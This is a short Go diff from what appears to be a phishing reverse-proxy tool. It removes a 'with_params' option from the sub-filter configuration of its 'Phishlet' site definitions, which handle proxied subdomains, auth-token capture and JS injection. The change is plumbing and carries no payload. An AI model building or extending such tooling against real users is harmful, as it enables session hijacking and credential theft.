@@ -27,7 +27,6 @@ type SubFilter struct {
 	regexp        string
 	replace       string
 	redirect_only bool
-	with_params   []string
 }
 
 type AuthToken struct {
@@ -118,7 +117,6 @@ type ConfigSubFilter struct {
 	Replace      *string   `mapstructure:"replace"`
 	Mimes        *[]string `mapstructure:"mimes"`
 	RedirectOnly bool      `mapstructure:"redirect_only"`
-	WithParams   *[]string `mapstructure:"with_params"`
 }
 
 type ConfigAuthToken struct {
@@ -335,10 +333,7 @@ func (p *Phishlet) LoadFromFile(site string, path string) error {
 		if sf.Replace == nil {
 			return fmt.Errorf("sub_filters: missing `replace` field")
 		}
-		if sf.WithParams == nil {
-			sf.WithParams = &[]string{}
-		}
-		p.addSubFilter(*sf.Hostname, *sf.Sub, *sf.Domain, *sf.Mimes, *sf.Search, *sf.Replace, sf.RedirectOnly, *sf.WithParams)
+		p.addSubFilter(*sf.Hostname, *sf.Sub, *sf.Domain, *sf.Mimes, *sf.Search, *sf.Replace, sf.RedirectOnly)
 	}
 	if fp.JsInject != nil {
 		for _, js := range *fp.JsInject {
@@ -691,14 +686,14 @@ func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, d
 	p.proxyHosts = append(p.proxyHosts, ProxyHost{phish_subdomain: phish_subdomain, orig_subdomain: orig_subdomain, domain: domain, handle_session: handle_session, is_landing: is_landing, auto_filter: auto_filter})
 }
 
-func (p *Phishlet) addSubFilter(hostname string, subdomain string, domain string, mime []string, regexp string, replace string, redirect_only bool, with_params []string) {
+func (p *Phishlet) addSubFilter(hostname string, subdomain string, domain string, mime []string, regexp string, replace string, redirect_only bool) {
 	hostname = strings.ToLower(hostname)
 	subdomain = strings.ToLower(subdomain)
 	domain = strings.ToLower(domain)
 	for n, _ := range mime {
 		mime[n] = strings.ToLower(mime[n])
 	}
-	p.subfilters[hostname] = append(p.subfilters[hostname], SubFilter{subdomain: subdomain, domain: domain, mime: mime, regexp: regexp, replace: replace, redirect_only: redirect_only, with_params: with_params})
+	p.subfilters[hostname] = append(p.subfilters[hostname], SubFilter{subdomain: subdomain, domain: domain, mime: mime, regexp: regexp, replace: replace, redirect_only: redirect_only})
 }
 
 func (p *Phishlet) addAuthTokens(hostname string, tokens []string) error {
